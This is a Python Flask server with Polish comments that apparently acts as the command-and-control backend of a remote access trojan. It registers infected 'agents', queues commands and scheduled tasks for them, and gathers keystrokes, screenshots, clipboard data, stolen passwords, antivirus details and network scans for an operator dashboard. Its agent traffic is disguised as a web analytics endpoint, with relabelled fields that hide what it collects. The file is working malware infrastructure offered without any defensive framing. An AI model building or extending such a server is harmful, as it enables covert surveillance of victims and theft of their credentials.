import sys
from flask import Flask, request, render_template, jsonify, redirect, url_for, session, send_file
from flask_compress import Compress
from flask_cors import CORS
from flask_socketio import SocketIO, emit
import threading
import time
import os
import base64
import json
import uuid
import datetime
import random
import io
import zipfile
from functools import wraps
import logging
import logging.handlers
import zlib
import bcrypt
import schedule
from reportlab.lib.pagesizes import letter
from reportlab.pdfgen import canvas
import ssl
from queue import Queue
import psutil
from datetime import timedelta
import subprocess
import traceback
from reportlab.lib import colors
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle

app = Flask(__name__, template_folder='templates')
Compress(app)
CORS(app, resources={r"/*": {"origins": "*"}})  # Tymczasowo zezwól na wszystkie źródła
app.secret_key = os.urandom(24)
app.permanent_session_lifetime = timedelta(minutes=30)

# Inicjalizacja SocketIO z optymalizacją
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading', engineio_logger=False)

# Kolejka do asynchronicznych zapisów
save_queue = Queue()
save_lock = threading.Lock()

# Niestandardowy Formatter
class CustomFormatter(logging.Formatter):
    def format(self, record):
        if not hasattr(record, 'ip'):
            record.ip = 'N/A'
        if not hasattr(record, 'agent_id'):
            record.agent_id = 'N/A'
        if not hasattr(record, 'user'):
            record.user = 'N/A'
        record.thread_id = threading.get_ident()
        record.cpu_usage = psutil.cpu_percent()
        return super().format(record)

# Konfiguracja logowania
log_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'logs')
os.makedirs(log_dir, exist_ok=True)

agent_logger = logging.getLogger('agent')
agent_logger.setLevel(logging.INFO)
agent_handler = logging.FileHandler(os.path.join(log_dir, 'agent.log'))
agent_handler.setLevel(logging.INFO)
agent_handler.setFormatter(CustomFormatter(
    '%(asctime)s - %(levelname)s - IP:%(ip)s - Agent:%(agent_id)s - User:%(user)s - Thread:%(thread_id)d - CPU:%(cpu_usage).1f%% - %(message)s'
))
agent_logger.addHandler(agent_handler)

gui_logger = logging.getLogger('gui')
gui_logger.setLevel(logging.INFO)
gui_handler = logging.FileHandler(os.path.join(log_dir, 'gui.log'))
gui_handler.setLevel(logging.INFO)
gui_handler.setFormatter(CustomFormatter(
    '%(asctime)s - %(levelname)s - IP:%(ip)s - User:%(user)s - Thread:%(thread_id)d - CPU:%(cpu_usage).1f%% - %(message)s'
))
gui_logger.addHandler(gui_handler)

critical_logger = logging.getLogger('critical')
critical_logger.setLevel(logging.WARNING)
critical_handler = logging.FileHandler(os.path.join(log_dir, 'critical_ops.log'))
critical_handler.setLevel(logging.WARNING)
critical_handler.setFormatter(CustomFormatter(
    '%(asctime)s - %(levelname)s - IP:%(ip)s - User:%(user)s - Thread:%(thread_id)d - CPU:%(cpu_usage).1f%% - %(message)s'
))
critical_logger.addHandler(critical_handler)

syslog_logger = logging.getLogger('syslog')
syslog_logger.setLevel(logging.DEBUG)
syslog_handler = logging.handlers.SysLogHandler(address=('10.10.10.7', 515))
syslog_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
syslog_logger.addHandler(syslog_handler)

USERS_FILE = 'users.json'
DATA_FILE = 'data.json'

# Struktury danych
agents = {}
commands = {}
results = {}
tasks = {}
keylog_data = {}
screenshots = {}
file_transfers = {}
sleep_status = {}
sent_commands = {}
system_info = {}
chat_messages = {}
errors = []
agent_groups = {}
system_changes = {}
clipboard_data = {}
network_scan = {}
permissions = {}
antivirus_data = {}
passwords = {}
ids_data = {}
agent_stats = {}
system_events = {}
beacon_stats = {}

def load_users():
    try:
        if not os.path.exists(USERS_FILE):
            syslog_logger.error("Plik %s nie istnieje", USERS_FILE, extra={'ip': 'N/A', 'user': 'system', 'agent_id': 'N/A'})
            errors.append({"timestamp": time.time(), "message": f"Plik {USERS_FILE} nie istnieje"})
            return []
        with open(USERS_FILE, 'r', encoding='utf-8') as f:
            data = json.load(f)
            users = data.get('users', [])
            syslog_logger.info("Załadowano %d użytkowników", len(users), extra={'ip': 'N/A', 'user': 'system', 'agent_id': 'N/A'})
            return users
    except Exception as e:
        logging.error("Błąd ładowania użytkowników: %s", str(e), extra={'ip': 'N/A', 'user': 'system', 'agent_id': 'N/A'})
        errors.append({"timestamp": time.time(), "message": f"Błąd ładowania użytkowników: {str(e)}"})
        return []

def load_data():
    global agents, commands, results, tasks, keylog_data, screenshots, file_transfers, sleep_status
    global sent_commands, system_info, chat_messages, errors, agent_groups, system_changes
    global clipboard_data, network_scan, permissions, antivirus_data, passwords, ids_data
    global agent_stats, system_events, beacon_stats
    try:
        if os.path.exists(DATA_FILE):
            with open(DATA_FILE, 'r', encoding='utf-8') as f:
                data = json.load(f)
                agents = data.get('agents', {})
                commands = data.get('commands', {})
                results = data.get('results', {})
                tasks = {
                    k: [
                        {
                            'command': t['command'],
                            'scheduled_time': datetime.datetime.strptime(t['scheduled_time'], "%Y-%m-%d %H:%M:%S"),
                            'executed': t['executed']
                        } for t in v
                    ] for k, v in data.get('tasks', {}).items()
                }
                keylog_data = data.get('keylog_data', {})
                screenshots = data.get('screenshots', {})
                file_transfers = data.get('file_transfers', {})
                sleep_status = data.get('sleep_status', {})
                sent_commands = data.get('sent_commands', {})
                system_info = data.get('system_info', {})
                chat_messages = data.get('chat_messages', {})
                errors = data.get('errors', [])
                agent_groups = data.get('agent_groups', {})
                system_changes = data.get('system_changes', {})
                clipboard_data = data.get('clipboard_data', {})
                network_scan = data.get('network_scan', {})
                permissions = data.get('permissions', {})
                antivirus_data = data.get('antivirus_data', {})
                passwords = data.get('passwords', {})
                ids_data = data.get('ids_data', {})
                agent_stats = data.get('agent_stats', {})
                system_events = data.get('system_events', {})
                beacon_stats = data.get('beacon_stats', {})
                for agent_id in agents:
                    agents[agent_id]['id'] = agent_id  # Zapewnienie jawnego pola ID
                    commands.setdefault(agent_id, [])
                    results.setdefault(agent_id, [])
                    tasks.setdefault(agent_id, [])
                    keylog_data.setdefault(agent_id, [])
                    screenshots.setdefault(agent_id, [])
                    file_transfers.setdefault(agent_id, [])
                    sleep_status.setdefault(agent_id, False)
                    sent_commands.setdefault(agent_id, [])
                    system_info.setdefault(agent_id, [])
                    chat_messages.setdefault(agent_id, [])
                    system_changes.setdefault(agent_id, [])
                    clipboard_data.setdefault(agent_id, [])
                    network_scan.setdefault(agent_id, [])
                    permissions.setdefault(agent_id, [])
                    antivirus_data.setdefault(agent_id, [])
                    passwords.setdefault(agent_id, [])
                    ids_data.setdefault(agent_id, [])
                    agent_stats.setdefault(agent_id, [])
                    system_events.setdefault(agent_id, [])
                    beacon_stats.setdefault(agent_id, [])
            logging.info("Dane załadowane z pliku data.json")
        else:
            logging.info("Plik data.json nie istnieje, inicjalizacja pustych danych")
            agents.clear()
            commands.clear()
            results.clear()
            tasks.clear()
            keylog_data.clear()
            screenshots.clear()
            file_transfers.clear()
            sleep_status.clear()
            sent_commands.clear()
            system_info.clear()
            chat_messages.clear()
            errors.clear()
            agent_groups.clear()
            system_changes.clear()
            clipboard_data.clear()
            network_scan.clear()
            permissions.clear()
            antivirus_data.clear()
            passwords.clear()
            ids_data.clear()
            agent_stats.clear()
            system_events.clear()
            beacon_stats.clear()
    except json.JSONDecodeError as e:
        logging.error(f"Błąd dekodowania data.json: {str(e)}, inicjalizacja pustych danych")
        errors.append({"timestamp": time.time(), "message": f"Błąd dekodowania data.json: {str(e)}"})
        agents.clear()
        commands.clear()
        results.clear()
        tasks.clear()
        keylog_data.clear()
        screenshots.clear()
        file_transfers.clear()
        sleep_status.clear()
        sent_commands.clear()
        system_info.clear()
        chat_messages.clear()
        errors.clear()
        agent_groups.clear()
        system_changes.clear()
        clipboard_data.clear()
        network_scan.clear()
        permissions.clear()
        antivirus_data.clear()
        passwords.clear()
        ids_data.clear()
        agent_stats.clear()
        system_events.clear()
        beacon_stats.clear()
    except Exception as e:
        logging.error(f"Błąd podczas ładowania danych: {str(e)}")
        errors.append({"timestamp": time.time(), "message": f"Błąd ładowania danych: {str(e)}"})

def async_save_data():
    """Przetwarza kolejkę zapisów asynchronicznie."""
    while True:
        data_to_save = save_queue.get()
        if data_to_save is None:
            break
        with save_lock:
            try:
                with open(DATA_FILE, 'w', encoding='utf-8') as f:
                    json.dump(data_to_save, f, indent=2, ensure_ascii=False)
                logging.info("Dane zapisane asynchronicznie", extra={'ip': 'N/A', 'user': 'system', 'agent_id': 'N/A'})
            except Exception as e:
                logging.error("Błąd zapisu asynchronicznego: %s", str(e), extra={'ip': 'N/A', 'user': 'system', 'agent_id': 'N/A'})
                errors.append({"timestamp": time.time(), "message": f"Błąd zapisu asynchronicznego: {str(e)}"})
        save_queue.task_done()

def broadcast_updates(data_type, data):
    """Wysyła aktualizacje przez WebSocket do wszystkich klientów."""
    try:
        socketio.emit(data_type, data, namespace='/updates')
    except Exception as e:
        logging.error(f"Błąd emisji WebSocket: {str(e)}")

def save_data(changes=None):
    """Dodaje dane do kolejki zapisów, opcjonalnie tylko zmiany."""
    if save_queue.qsize() > 100:
        logging.warning("Kolejka zapisu pełna, odrzucam starsze dane", extra={'ip': 'N/A', 'user': 'system', 'agent_id': 'N/A'})
        try:
            save_queue.get_nowait()
        except Queue.Empty:
            pass
    with save_lock:
        if changes:
            if os.path.exists(DATA_FILE):
                try:
                    with open(DATA_FILE, 'r', encoding='utf-8') as f:
                        current_data = json.load(f)
                except (json.JSONDecodeError, FileNotFoundError):
                    current_data = {}
            else:
                current_data = {}
            current_data.update(changes)
            for key, value in changes.items():
                if not isinstance(value, (dict, list)):
                    logging.warning("Nieprawidłowy typ danych dla %s: %s", key, type(value), extra={'ip': 'N/A', 'user': 'system', 'agent_id': 'N/A'})
                    current_data[key] = {}
            save_queue.put(current_data)
            for key in changes:
                if key == 'agents':
                    broadcast_updates('agents_update', changes[key])
                elif key == 'errors':
                    broadcast_updates('errors_update', changes[key][-10:])
                elif key == 'results':
                    for agent_id in changes[key]:
                        broadcast_updates('results_update', {agent_id: changes[key][agent_id][-10:]})
                elif key == 'keylog_data':
                    for agent_id in changes[key]:
                        broadcast_updates('keylogs_update', {agent_id: changes[key][agent_id][-10:]})
                elif key == 'screenshots':
                    for agent_id in changes[key]:
                        broadcast_updates('screenshots_update', {agent_id: changes[key][agent_id][-10:]})
                elif key == 'file_transfers':
                    for agent_id in changes[key]:
                        broadcast_updates('file_transfers_update', {agent_id: changes[key][agent_id][-10:]})
                elif key == 'system_info':
                    for agent_id in changes[key]:
                        broadcast_updates('system_info_update', {agent_id: changes[key][agent_id][-10:]})
                elif key == 'system_changes':
                    for agent_id in changes[key]:
                        broadcast_updates('system_changes_update', {agent_id: changes[key][agent_id][-10:]})
                elif key == 'clipboard_data':
                    for agent_id in changes[key]:
                        broadcast_updates('clipboard_update', {agent_id: changes[key][agent_id][-10:]})
                elif key == 'network_scan':
                    for agent_id in changes[key]:
                        broadcast_updates('network_scan_update', {agent_id: changes[key][agent_id][-10:]})
                elif key == 'permissions':
                    for agent_id in changes[key]:
                        broadcast_updates('permissions_update', {agent_id: changes[key][agent_id][-10:]})
                elif key == 'antivirus_data':
                    for agent_id in changes[key]:
                        broadcast_updates('antivirus_update', {agent_id: changes[key][agent_id][-10:]})
                elif key == 'passwords':
                    for agent_id in changes[key]:
                        broadcast_updates('passwords_update', {agent_id: changes[key][agent_id][-10:]})
                elif key == 'ids_data':
                    for agent_id in changes[key]:
                        broadcast_updates('ids_update', {agent_id: changes[key][agent_id][-10:]})
                elif key == 'agent_stats':
                    for agent_id in changes[key]:
                        broadcast_updates('agent_stats_update', {agent_id: changes[key][agent_id][-10:]})
                elif key == 'system_events':
                    for agent_id in changes[key]:
                        broadcast_updates('system_events_update', {agent_id: changes[key][agent_id][-10:]})
                elif key == 'tasks':
                    for agent_id in changes[key]:
                        broadcast_updates('tasks_update', {agent_id: [
                            {
                                'command': t['command'],
                                'scheduled_time': t['scheduled_time'].strftime("%Y-%m-%d %H:%M:%S"),
                                'executed': t['executed']
                            } for t in changes[key][agent_id][-10:]
                        ]})
                elif key == 'agent_groups':
                    broadcast_updates('groups_update', changes[key])
                elif key == 'chat_messages':
                    for agent_id in changes[key]:
                        broadcast_updates('chat_messages_update', {agent_id: changes[key][agent_id][-10:]})
        else:
            data = {
                'agents': agents,
                'commands': commands,
                'results': results,
                'tasks': {
                    k: [{'command': t['command'], 'scheduled_time': t['scheduled_time'].strftime("%Y-%m-%d %H:%M:%S"), 'executed': t['executed']} for t in v]
                    for k, v in tasks.items()
                },
                'keylog_data': keylog_data,
                'screenshots': screenshots,
                'file_transfers': file_transfers,
                'sleep_status': sleep_status,
                'sent_commands': sent_commands,
                'system_info': system_info,
                'chat_messages': chat_messages,
                'errors': errors[-100:],
                'agent_groups': agent_groups,
                'system_changes': system_changes,
                'clipboard_data': clipboard_data,
                'network_scan': network_scan,
                'permissions': permissions,
                'antivirus_data': antivirus_data,
                'passwords': passwords,
                'ids_data': ids_data,
                'agent_stats': agent_stats,
                'system_events': system_events,
                'beacon_stats': beacon_stats
            }
            for key, value in data.items():
                if not isinstance(value, (dict, list)):
                    logging.warning("Nieprawidłowy typ danych dla %s: %s", key, type(value), extra={'ip': 'N/A', 'user': 'system', 'agent_id': 'N/A'})
                    data[key] = {}
            save_queue.put(data)
            broadcast_updates('agents_update', agents)
            broadcast_updates('errors_update', errors[-10:])
            broadcast_updates('groups_update', agent_groups)
            broadcast_updates('sent_commands_update', sent_commands)
            for agent_id in results:
                broadcast_updates('results_update', {agent_id: results[agent_id][-10:]})
            for agent_id in keylog_data:
                broadcast_updates('keylogs_update', {agent_id: keylog_data[agent_id][-10:]})
            for agent_id in screenshots:
                broadcast_updates('screenshots_update', {agent_id: screenshots[agent_id][-10:]})
            for agent_id in file_transfers:
                broadcast_updates('file_transfers_update', {agent_id: file_transfers[agent_id][-10:]})
            for agent_id in system_info:
                broadcast_updates('system_info_update', {agent_id: system_info[agent_id][-10:]})
            for agent_id in system_changes:
                broadcast_updates('system_changes_update', {agent_id: system_changes[agent_id][-10:]})
            for agent_id in clipboard_data:
                broadcast_updates('clipboard_update', {agent_id: clipboard_data[agent_id][-10:]})
            for agent_id in network_scan:
                broadcast_updates('network_scan_update', {agent_id: network_scan[agent_id][-10:]})
            for agent_id in permissions:
                broadcast_updates('permissions_update', {agent_id: permissions[agent_id][-10:]})
            for agent_id in antivirus_data:
                broadcast_updates('antivirus_update', {agent_id: antivirus_data[agent_id][-10:]})
            for agent_id in passwords:
                broadcast_updates('passwords_update', {agent_id: passwords[agent_id][-10:]})
            for agent_id in ids_data:
                broadcast_updates('ids_update', {agent_id: ids_data[agent_id][-10:]})
            for agent_id in agent_stats:
                broadcast_updates('agent_stats_update', {agent_id: agent_stats[agent_id][-10:]})
            for agent_id in system_events:
                broadcast_updates('system_events_update', {agent_id: system_events[agent_id][-10:]})
            for agent_id in tasks:
                broadcast_updates('tasks_update', {agent_id: [
                    {
                        'command': t['command'],
                        'scheduled_time': t['scheduled_time'].strftime("%Y-%m-%d %H:%M:%S"),
                        'executed': t['executed']
                    } for t in tasks[agent_id][-10:]
                ]})
            for agent_id in chat_messages:
                broadcast_updates('chat_messages_update', {agent_id: chat_messages[agent_id][-10:]})

def clean_old_data():
    cutoff_time = time.time() - (7 * 24 * 60 * 60)
    for agent_id in agents:
        for data_list in [results.get(agent_id, []), keylog_data.get(agent_id, []), screenshots.get(agent_id, []),
                          file_transfers.get(agent_id, []), system_info.get(agent_id, []), sent_commands.get(agent_id, []),
                          chat_messages.get(agent_id, []), system_changes.get(agent_id, []), clipboard_data.get(agent_id, []),
                          network_scan.get(agent_id, []), permissions.get(agent_id, []), antivirus_data.get(agent_id, []),
                          passwords.get(agent_id, []), ids_data.get(agent_id, []), agent_stats.get(agent_id, []),
                          system_events.get(agent_id, [])]:
            data_list[:] = [item for item in data_list if item.get('timestamp', float('inf')) > cutoff_time]
    errors[:] = [err for err in errors if err.get('timestamp', float('inf')) > cutoff_time]
    save_data()
    logging.info("Wyczyszczono dane starsze niż 7 dni", extra={'ip': 'N/A', 'user': 'system', 'agent_id': 'N/A'})
    broadcast_updates('errors_update', errors[-10:])

def log_system_stats():
    cpu = psutil.cpu_percent()
    mem = psutil.virtual_memory().percent
    threads = threading.active_count()
    queue_size = save_queue.qsize()
    logging.info(
        "Statystyki serwera: CPU=%.1f%%, Mem=%.1f%%, Wątki=%d, Kolejka zapisów=%d",
        cpu, mem, threads, queue_size,
        extra={'ip': 'N/A', 'user': 'system', 'agent_id': 'N/A'}
    )

def send_periodic_updates():
    while True:
        try:
            socketio.emit('agents_update', agents, namespace='/updates')
            metrics = {
                'agents_online': len([a for a in agents.values() if a['status'] == 'online']),
                'errors_last_hour': len([e for e in errors if e['timestamp'] > time.time() - 3600]),
                'commands_sent': sum(len(cmds) for cmds in sent_commands.values()),
                'queue_size': save_queue.qsize(),
                'active_threads': threading.active_count()
            }
            socketio.emit('metrics_update', metrics, namespace='/updates')
            socketio.emit('errors_update', errors[-10:], namespace='/updates')
            socketio.emit('sent_commands_update', sent_commands, namespace='/updates')
            for agent_id in results:
                socketio.emit('results_update', {agent_id: results[agent_id][-10:]}, namespace='/updates')
            for agent_id in keylog_data:
                socketio.emit('keylogs_update', {agent_id: keylog_data[agent_id][-10:]}, namespace='/updates')
            for agent_id in screenshots:
                socketio.emit('screenshots_update', {agent_id: screenshots[agent_id][-10:]}, namespace='/updates')
            for agent_id in file_transfers:
                socketio.emit('file_transfers_update', {agent_id: file_transfers[agent_id][-10:]}, namespace='/updates')
            for agent_id in system_info:
                socketio.emit('system_info_update', {agent_id: system_info[agent_id][-10:]}, namespace='/updates')
            for agent_id in system_changes:
                socketio.emit('system_changes_update', {agent_id: system_changes[agent_id][-10:]}, namespace='/updates')
            for agent_id in clipboard_data:
                socketio.emit('clipboard_update', {agent_id: clipboard_data[agent_id][-10:]}, namespace='/updates')
            for agent_id in network_scan:
                socketio.emit('network_scan_update', {agent_id: network_scan[agent_id][-10:]}, namespace='/updates')
            for agent_id in permissions:
                socketio.emit('permissions_update', {agent_id: permissions[agent_id][-10:]}, namespace='/updates')
            for agent_id in antivirus_data:
                socketio.emit('antivirus_update', {agent_id: antivirus_data[agent_id][-10:]}, namespace='/updates')
            for agent_id in passwords:
                socketio.emit('passwords_update', {agent_id: passwords[agent_id][-10:]}, namespace='/updates')
            for agent_id in ids_data:
                socketio.emit('ids_update', {agent_id: ids_data[agent_id][-10:]}, namespace='/updates')
            for agent_id in agent_stats:
                socketio.emit('agent_stats_update', {agent_id: agent_stats[agent_id][-10:]}, namespace='/updates')
            for agent_id in system_events:
                socketio.emit('system_events_update', {agent_id: system_events[agent_id][-10:]}, namespace='/updates')
            for agent_id in tasks:
                socketio.emit('tasks_update', {agent_id: [
                    {
                        'command': t['command'],
                        'scheduled_time': t['scheduled_time'].strftime("%Y-%m-%d %H:%M:%S"),
                        'executed': t['executed']
                    } for t in tasks[agent_id][-10:]
                ]}, namespace='/updates')
            socketio.emit('groups_update', agent_groups, namespace='/updates')
            for agent_id in chat_messages:
                socketio.emit('chat_messages_update', {agent_id: chat_messages[agent_id][-10:]}, namespace='/updates')
        except Exception as e:
            logging.error(f"Błąd wysyłania aktualizacji WebSocket: {str(e)}")
        time.sleep(2)  # Zredukowano interwał dla szybszego odświeżania

def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'logged_in' not in session:
            return redirect(url_for('login_page'))
        return f(*args, **kwargs)
    return decorated_function

def role_required(role):
    def decorator(f):
        @wraps(f)
        @login_required
        def decorated_function(*args, **kwargs):
            if session.get('role') != role:
                logging.warning("Brak uprawnień dla roli %s", role, extra={'ip': request.remote_addr, 'user': session.get('username', 'anonymous'), 'agent_id': 'N/A'})
                errors.append({"timestamp": time.time(), "message": f"Użytkownik {session.get('username')} - brak uprawnień dla roli {role}"})
                broadcast_updates('errors_update', errors[-10:])
                return jsonify({'status': 'error', 'message': 'Brak uprawnień'}), 403
            return f(*args, **kwargs)
        return decorated_function
    return decorator

@app.route('/')
def index():
    if 'logged_in' in session:
        return render_template('index.html')
    return redirect(url_for('login_page'))

@app.route('/login_page.html')
def login_page():
    return render_template('login_page.html')

@app.route('/api/login', methods=['POST'])
def login():
    error = None
    username = request.json.get('username')
    password = request.json.get('password', '')
    ip = request.remote_addr
    gui_logger.debug("Próba logowania dla użytkownika: %s", username, extra={'ip': ip, 'user': username or 'anonymous', 'agent_id': 'N/A'})
    if not username or not password:
        error = 'Brak nazwy użytkownika lub hasła'
        gui_logger.warning("Próba logowania bez danych", extra={'ip': ip, 'user': 'anonymous', 'agent_id': 'N/A'})
        errors.append({"timestamp": time.time(), "message": "Próba logowania bez danych"})
        broadcast_updates('errors_update', errors[-10:])
        return jsonify({'status': 'error', 'message': error}), 400
    try:
        password_encoded = password.encode('utf-8')
    except UnicodeEncodeError as e:
        error = 'Błąd kodowania hasła'
        gui_logger.error("Błąd kodowania hasła: %s", str(e), extra={'ip': ip, 'user': username, 'agent_id': 'N/A'})
        errors.append({"timestamp": time.time(), "message": f"Błąd kodowania hasła: {str(e)}"})
        broadcast_updates('errors_update', errors[-10:])
        return jsonify({'status': 'error', 'message': error}), 400
    users = load_users()
    for user in users:
        if user.get('username') == username:
            stored_password = user.get('password')
            try:
                if bcrypt.checkpw(password_encoded, stored_password.encode('utf-8')):
                    session['logged_in'] = True
                    session['username'] = username
                    session['role'] = user.get('role')
                    gui_logger.info("Użytkownik zalogowany pomyślnie", extra={'ip': ip, 'user': username, 'agent_id': 'N/A'})
                    return jsonify({'status': 'success', 'message': 'Zalogowano pomyślnie'})
                else:
                    error = 'Nieprawidłowe hasło'
                    gui_logger.warning("Nieprawidłowe hasło", extra={'ip': ip, 'user': username, 'agent_id': 'N/A'})
                    errors.append({"timestamp": time.time(), "message": f"Nieprawidłowe hasło dla użytkownika: {username}"})
                    broadcast_updates('errors_update', errors[-10:])
            except ValueError as e:
                error = 'Błąd weryfikacji hasła'
                gui_logger.error("Błąd weryfikacji hasła: %s", str(e), extra={'ip': ip, 'user': username, 'agent_id': 'N/A'})
                errors.append({"timestamp": time.time(), "message": f"Błąd weryfikacji hasła: {str(e)}"})
                broadcast_updates('errors_update', errors[-10:])
            return jsonify({'status': 'error', 'message': error}), 401
    error = 'Nieprawidłowy użytkownik'
    gui_logger.warning("Nieudana próba logowania", extra={'ip': ip, 'user': username, 'agent_id': 'N/A'})
    errors.append({"timestamp": time.time(), "message": f"Nieudana próba logowania: {username}"})
    broadcast_updates('errors_update', errors[-10:])
    return jsonify({'status': 'error', 'message': error}), 401

@app.route('/logout')
def logout():
    username = session.get('username')
    ip = request.remote_addr
    session.pop('logged_in', None)
    session.pop('username', None)
    session.pop('role', None)
    gui_logger.info("Użytkownik wylogowany", extra={'ip': ip, 'user': username or 'anonymous', 'agent_id': 'N/A'})
    # return jsonify({'status': 'success', 'message': 'Wylogowano'})
    return redirect(url_for('login_page'))

@app.route('/api/log_ui_interaction', methods=['POST'])
@login_required
def log_ui_interaction():
    ip = request.remote_addr
    user = session.get('username', 'anonymous')
    data = request.json
    action = data.get('action')
    section = data.get('section')
    details = data.get('details', '')
    if not action:
        gui_logger.warning("Brak akcji w log_ui_interaction", extra={'ip': ip, 'user': user, 'agent_id': 'N/A'})
        return jsonify({'status': 'error', 'message': 'Brak akcji'}), 400
    gui_logger.info(
        "Interakcja UI: akcja=%s, sekcja=%s, szczegóły=%s",
        action, section or 'N/A', details,
        extra={'ip': ip, 'user': user, 'agent_id': 'N/A'}
    )
    return jsonify({'status': 'success'})

@socketio.on('connect', namespace='/updates')
def handle_connect():
    logging.info(f"Klient WebSocket podłączony: {request.sid}")
    emit('agents_update', agents, namespace='/updates')
    emit('metrics_update', {
        'agents_online': len([a for a in agents.values() if a['status'] == 'online']),
        'errors_last_hour': len([e for e in errors if e['timestamp'] > time.time() - 3600]),
        'commands_sent': sum(len(cmds) for cmds in sent_commands.values()),
        'queue_size': save_queue.qsize(),
        'active_threads': threading.active_count()
    }, namespace='/updates')
    emit('errors_update', errors[-10:], namespace='/updates')
    emit('groups_update', agent_groups, namespace='/updates')
    emit('sent_commands_update', sent_commands, namespace='/updates')
    for agent_id in results:
        emit('results_update', {agent_id: results[agent_id][-10:]}, namespace='/updates')
    for agent_id in keylog_data:
        emit('keylogs_update', {agent_id: keylog_data[agent_id][-10:]}, namespace='/updates')
    for agent_id in screenshots:
        emit('screenshots_update', {agent_id: screenshots[agent_id][-10:]}, namespace='/updates')
    for agent_id in file_transfers:
        emit('file_transfers_update', {agent_id: file_transfers[agent_id][-10:]}, namespace='/updates')
    for agent_id in system_info:
        emit('system_info_update', {agent_id: system_info[agent_id][-10:]}, namespace='/updates')
    for agent_id in system_changes:
        emit('system_changes_update', {agent_id: system_changes[agent_id][-10:]}, namespace='/updates')
    for agent_id in clipboard_data:
        emit('clipboard_update', {agent_id: clipboard_data[agent_id][-10:]}, namespace='/updates')
    for agent_id in network_scan:
        emit('network_scan_update', {agent_id: network_scan[agent_id][-10:]}, namespace='/updates')
    for agent_id in permissions:
        emit('permissions_update', {agent_id: permissions[agent_id][-10:]}, namespace='/updates')
    for agent_id in antivirus_data:
        emit('antivirus_update', {agent_id: antivirus_data[agent_id][-10:]}, namespace='/updates')
    for agent_id in passwords:
        emit('passwords_update', {agent_id: passwords[agent_id][-10:]}, namespace='/updates')
    for agent_id in ids_data:
        emit('ids_update', {agent_id: ids_data[agent_id][-10:]}, namespace='/updates')
    for agent_id in agent_stats:
        emit('agent_stats_update', {agent_id: agent_stats[agent_id][-10:]}, namespace='/updates')
    for agent_id in system_events:
        emit('system_events_update', {agent_id: system_events[agent_id][-10:]}, namespace='/updates')
    for agent_id in tasks:
        emit('tasks_update', {agent_id: [
            {
                'command': t['command'],
                'scheduled_time': t['scheduled_time'].strftime("%Y-%m-%d %H:%M:%S"),
                'executed': t['executed']
            } for t in tasks[agent_id][-10:]
        ]}, namespace='/updates')
    for agent_id in chat_messages:
        emit('chat_messages_update', {agent_id: chat_messages[agent_id][-10:]}, namespace='/updates')

@socketio.on('disconnect', namespace='/updates')
def handle_disconnect():
    logging.info(f"Klient WebSocket rozłączony: {request.sid}")

@app.route('/api/v1/analytics', methods=['POST'])
def analytics():
    ip = request.remote_addr
    data = request.json
    agent_id = data.get('visitor_id', 'unknown')
    try:
        agent_logger.debug("Otrzymano żądanie: %s", json.dumps(data), extra={'ip': ip, 'agent_id': agent_id, 'user': 'N/A'})
        if not data or not isinstance(data, dict):
            raise ValueError("Brak lub nieprawidłowe dane w żądaniu")
        action = data.get('action')
        if not action:
            raise ValueError("Brak pola 'action' w żądaniu")
        agent_logger.info("Akcja: %s", action, extra={'ip': ip, 'agent_id': agent_id, 'user': 'N/A'})
        handlers = {
            'register': handle_register,
            'beacon': handle_beacon,
            'result': handle_result,
            'keylog': handle_keylog,
            'screenshot': handle_screenshot,
            'file_upload': handle_file_upload,
            'file_download_request': handle_file_download_request,
            'system_changes': handle_system_changes,
            'clipboard': handle_clipboard,
            'network_scan': handle_network_scan,
            'permissions': handle_permissions,
            'antivirus': handle_antivirus,
            'passwords': handle_passwords,
            'ids': handle_ids,
            'agent_stats': handle_agent_stats,
            'system_event': handle_system_event,
            'agent_error': handle_agent_error,
            'system_info': handle_system_info
        }
        handler = handlers.get(action)
        if handler:
            return handler(data)
        logging.warning("Nieznana akcja: %s", action, extra={'ip': ip, 'agent_id': agent_id, 'user': 'N/A'})
        return jsonify({
            'status': 'success',
            'session_id': str(uuid.uuid4()),
            'analytics_version': '2.5.2'
        })
    except Exception as e:
        logging.error("Błąd w /api/v1/analytics: %s, szczegóły: %s", str(e), json.dumps(data, default=str), extra={'ip': ip, 'agent_id': agent_id, 'user': 'N/A'})
        errors.append({"timestamp": time.time(), "message": f"Błąd w /api/v1/analytics: {str(e)}, dane: {json.dumps(data, default=str)}"})
        broadcast_updates('errors_update', errors[-10:])
        return jsonify({'status': 'error', 'message': f'Błąd: {str(e)}'}), 500

def handle_register(data):
    agent_id = data.get('visitor_id')
    ip = data.get('ip_address', request.remote_addr)
    if not agent_id:
        agent_logger.error("Brak visitor_id", extra={'ip': ip, 'agent_id': 'unknown', 'user': 'N/A'})
        errors.append({"timestamp": time.time(), "message": "Brak visitor_id w register"})
        broadcast_updates('errors_update', errors[-10:])
        return jsonify({'status': 'error', 'message': 'Brak visitor_id'}), 400
    if agent_id in agents and agents[agent_id]['status'] == 'online':
        agent_logger.warning("Agent już zarejestrowany: %s", agent_id, extra={'ip': ip, 'agent_id': agent_id, 'user': 'N/A'})
        return jsonify({'status': 'error', 'message': 'Agent już zarejestrowany'}), 409
    hostname = data.get('device_name', 'unknown')
    user_type = data.get('user_type', 'unknown')
    browser_info = data.get('browser_info', 'unknown')
    is_mobile = data.get('is_mobile', False)
    gui_available = data.get('gui_available', False)
    agent_logger.debug(
        "Rejestracja agenta: agent_id=%s, ip=%s, hostname=%s, user_type=%s",
        agent_id, ip, hostname, user_type,
        extra={'ip': ip, 'agent_id': agent_id, 'user': 'N/A'}
    )
    agents[agent_id] = {
        'id': agent_id,  # Dodano jawne pole ID
        'hostname': hostname,
        'username': user_type,
        'os_info': browser_info,
        'ip': ip,
        'last_seen': time.time(),
        'status': 'online',
        'is_vm': is_mobile,
        'gui_available': gui_available,
        'sleep_until': 0,
        'first_seen': agents.get(agent_id, {}).get('first_seen', time.time())
    }
    commands.setdefault(agent_id, [])
    results.setdefault(agent_id, [])
    tasks.setdefault(agent_id, [])
    keylog_data.setdefault(agent_id, [])
    screenshots.setdefault(agent_id, [])
    file_transfers.setdefault(agent_id, [])
    sleep_status.setdefault(agent_id, False)
    sent_commands.setdefault(agent_id, [])
    system_info.setdefault(agent_id, [])
    chat_messages.setdefault(agent_id, [])
